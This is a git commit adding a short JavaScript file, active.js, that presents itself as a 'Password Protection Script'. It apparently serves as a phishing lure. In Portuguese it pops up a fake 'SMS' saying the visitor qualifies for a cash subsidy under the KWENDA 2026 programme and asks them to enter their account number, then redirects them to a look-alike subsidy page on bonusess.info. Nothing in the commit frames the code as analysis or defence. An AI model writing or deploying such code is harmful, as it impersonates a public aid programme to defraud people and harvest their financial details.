226e849aa772ccb586e99c3b314f7f9a004e9c9c
All-Bonuses <hezzlaww@gmail.com>
2026-01-03 22:07:28 +0100

    Create active.js

---
+++ active.js
@@ -0,0 +1,9 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'RETIRAR DINHEIRO'
+password = prompt(
+  'SMS: Parabéns! Você é elegível para receber o Subsídio em Dinheiro do Programa KWENDA 2026 para Negócios. Por favor, clique em OK para introduzir o número da sua conta.',
+  'RETIRAR DINHEIRO'
+);
+if (password != 'RETIRAR DINHEIRO') {
+  location.href = 'https://bonusess.info/Kwenda-Subsídio.html';
+  }
